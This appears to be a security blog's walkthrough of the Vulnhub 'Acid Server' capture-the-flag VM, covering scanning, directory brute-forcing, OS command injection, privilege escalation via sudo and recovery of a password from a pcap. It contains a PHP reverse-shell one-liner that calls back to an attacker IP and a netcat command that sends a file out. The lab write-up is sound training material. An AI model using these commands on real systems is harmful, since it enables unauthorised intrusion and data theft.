---
layout: post
title: 'ACID: SERVER (Vulnhub CTF Walkthrough)'
tags: [Vulnhub, CTF]
color: red
permalink: acid-server-vulnhub/
author: shivamsaraswat
excerpt_separator: <!--more-->
---

<center><img src="/assets/img/feature-img/vulnhub.png" alt="Machine Information"></center>
<br>
The name of the Virtual machine is "**Acid Server**" that we are going to solve today. It is a Boot2Root VM. This is a web-based VM.

<!--more-->

Let's get started!

<h1 id="contents-">Contents <a name="top"></a></h1>
* TOC
{:toc}
<hr>

> _**Download link:** [https://www.vulnhub.com/entry/acid-server,125/](https://www.vulnhub.com/entry/acid-server,125/)_ <br>
> _**Goal:** Escalate the privileges to root and capture the flag._
<hr>

## Description

Welcome to the world of Acid.

Fairy tails uses secret keys to open the magical doors.

<hr>

## Strategy to Solve

- Network Scanning (arp-scan, Nmap)
- Directory Brute-force (gobuster)
- Exploit OS command vulnerability on the web page to gain a reverse shell
- Import python one-liner to get an interactive shell
- Search and download the pcap file
- Steal password from the pcap file (Wireshark)
- Get into the shell for privilege escalation
- Switch user (su)
- Take root access and capture the flag

<hr>

## Network Scanning 

### ARP Scan

FIrst, let's find what is the target.

```bash
arp-scan -l
```

<center><img src="/assets/img/vulnhub/acid-server/asv1.png" alt="ARP Scan"></center>
<br>
Our target is **192.168.225.140**
<hr>

### Nmap Scan

Now, fire up **nmap** to scan the ports available on the target.

```bash
nmap -p- -A -T4 192.168.225.140
```

<center><img src="/assets/img/vulnhub/acid-server/asv2.png" alt="nmap"></center>
<br>
Nmap results show that there is only one open port i.e. **33447** with the services of **HTTP**. Please observe here that port 80 is not open that means if we want to open this IP address in the browser then we have to use the port number as it will not open it by default. So now open the web page using port number **33447**.

<center><img src="/assets/img/vulnhub/acid-server/asv3.png" alt="Port 33447"></center>
<br>
From the above image, we can see that there are only a heading and a quote on the page; nothing else but if you look at the tab on the browser, it says “ **/Challenge** ”. This can be a directory. Let's try opening it.

<center><img src="/assets/img/vulnhub/acid-server/asv4.png" alt="Challenge"></center>
<br>
It's opened and we got this login page.

<hr>

## Directory Brute-force

Now, let's try **[gobuster](https://github.com/OJ/gobuster)** to know more about this directory, with the small dictionary (/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt).

```bash
gobuster dir -u http://192.168.225.140:33447/Challenge -x php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 2>/dev/null
```

Here, I am using "**-x php**" for searching files with php extension.

**Note: _"2 \>/dev/null"_** will filter out the errors so that they will not be shown in output of console.

<center><img src="/assets/img/vulnhub/acid-server/asv5.png" alt="Gobuster 1"></center>
<br>
I tried every directory but the only **cake.php** was looking useful. So, let's open it in the browser.

<center><img src="/assets/img/vulnhub/acid-server/asv6.png" alt="cake.php"></center>
<br>
When you open cake.php, the page says **“Ah.haan…There is long way to go..dude :-)”.** But upon looking closely you will find the **/Magic\_Box** is written on the browser tab. Let's open it just like /Challenge.

<center><img src="/assets/img/vulnhub/acid-server/asv7.png" alt="magic box"></center>

On opening, this page says that we don’t have permission to access it.

<br>
OK! Then let's try **gobuster** on this directory.

```bash
gobuster dir -u http://192.168.225.140:33447/Challenge/Magic_Box -x php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 2>/dev/null
```

<center><img src="/assets/img/vulnhub/acid-server/asv8.png" alt="Gobuster 2"></center>
<br>
Out of all directories, the only **command.php** was looking useful. Let's open it in the browser.

<center><img src="/assets/img/vulnhub/acid-server/asv9.png" alt="command.php"></center>

<hr>

## Exploitation

Upon opening, you will find a **ping** portal that means you can ping any IP address from here. Try to ping any IP and confirm the results on the page source.

This shows that there are possibilities for **[OS Command Injection](https://portswigger.net/web-security/os-command-injection)** and to be sure let's run any arbitrary command such as "**; ls**" as shown below.

**Read more: [Run multiple commands in Linux](https://dev.to/0xbf/run-multiple-commands-in-one-line-with-and-linux-tips-5hgm)**

<center><img src="/assets/img/vulnhub/acid-server/asv10.png" alt="OS Command Injection"></center>
<br>
On the page source, you can confirm the results of **ls** command. And this confirms that this page is vulnerable to [OS Command Injection](https://portswigger.net/web-security/os-command-injection).

<center><img src="/assets/img/vulnhub/acid-server/asv11.png" alt="ls"></center>

<hr>

### Get Reverse Shell

As the page title says "**Reverse Kunfu**", it is the hint towards **Reverse Shell**. So without any delay, run a listener **(nc -nvlp 8000)** on the attacking machine and enter the following command in the page to take the reverse shell.

```bash
php -r '$sock=fsockopen("192.168.225.139",8000);exec("/bin/sh -i <&3 >&3 2>&3");'
```

**Note:** Replace the IP and listener port with yours.

<center><img src="/assets/img/vulnhub/acid-server/asv12.png" alt="PHP Reverse Shell"></center>
<br>
I got the shell with **_www-data_** user. Also, this is a non-interactive shell and we need an interactive one. Without interaction, the OS cannot ask for password and **su** won't work.

<hr>

### Upgrade to Interactive Shell
Run the following command to get the interactive shell.

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

<center><img src="/assets/img/vulnhub/acid-server/asv13.png" alt="Interactive Shell"></center>

<hr>

### Finding saman Password

I started checking for files in the system. I found an unusual directory "**s.bin**" in the system root. It contains a file "**investigate.php**" whose content asks us to behave like an investigator to catch the culprit.

<center><img src="/assets/img/vulnhub/acid-server/asv14.png" alt="investigate.php"></center>
<br>
After going into the **/home** directory, I found a local user named "**saman**". This can be a useful user for us but we don't have a password to login into it. Let's try to find the password.

<center><img src="/assets/img/vulnhub/acid-server/asv15.png" alt="Saman"></center>
<br>
Further looking into the filesystem, I found a directory "**raw\_vs\_isi**" inside **/sbin** directory. It contains a **pcap** file "**hint.pcapng**".

I transfered this file to my own attacking machine with **netcat**:

> _**On the attacking machine:** _nc -lp 1234 \> pcap_ <br>
> _**On the target machine:** nc 192.168.225.139 1234 \< hint.pcapng_

After opening this file with Wireshark, I found a conversation in the TCP stream. Just **right-click** on any of these filtered packets and then click on the **Follow** option and then select **TCP stream**.

<center><img src="/assets/img/vulnhub/acid-server/asv16.png" alt="Wireshark"></center>

<center><img src="/assets/img/vulnhub/acid-server/asv17.png" alt="saman password"></center>
<br>
In the conversation, one of them says "**saman and nowadays he's known by the alias of 1337hax0r**" which means **saman** is the username (found in the /home directory) and **1337hax0r** can be the password. Let's try it.

<center><img src="/assets/img/vulnhub/acid-server/asv18.png" alt="su saman"></center>
<br>
We are now login as saman. Here, the result of the "**sudo -l**" command tells us that we can run any command as the root user.

<hr>

## Privilege Escalation to root

Whenever I get a shell of any box I try to run "**sudo -l**" to check for any misconfigured permissions. In this case, I could see that saman had the permission to run all command as root!

<center><img src="/assets/img/vulnhub/acid-server/asv19.png" alt="su saman"></center>
<br>
So, let's try to switch the user to the **root** user.

```bash
sudo su
```

<center><img src="/assets/img/vulnhub/acid-server/asv20.png" alt="nmap"></center>
<br>
So we got the root with a **Congratulations** banner.

But, we still have to find the flag. Start with the root's home directory. It contains only one file **_flag.txt_**. So, let's open it.

```bash
cat flag.txt
```

<center><img src="/assets/img/vulnhub/acid-server/asv21.png" alt="nmap"></center>
<br>
After opening the file, we get a message that we successfully completed the challenge.

**Note:** There are multiple ways to complete this challenge right from the first webpage. Readers are encouraged to try finding the flag in other ways.

<hr>

**I hope, this post helped you to solve this CTF easily and you must have learned something new.**

**Feel free to [contact me](/contact/) for any suggestions and feedbacks. I would really appreciate those.**

Thank you for reading!

You can also **[Buy Me A Coffee](https://www.buymeacoffee.com/cybersapien)** if you love the content and want to support this blog page!

<script type="text/javascript" src="https://cdnjs.buymeacoffee.com/1.0.0/button.prod.min.js" data-name="bmc-button" data-slug="cybersapien" data-color="#FFDD00" data-emoji=""  data-font="Cookie" data-text="Buy me a coffee" data-outline-color="#000000" data-font-color="#000000" data-coffee-color="#ffffff" ></script>

<a href="#top" style="float: right"><strong>Back to Top⮭</strong> </a>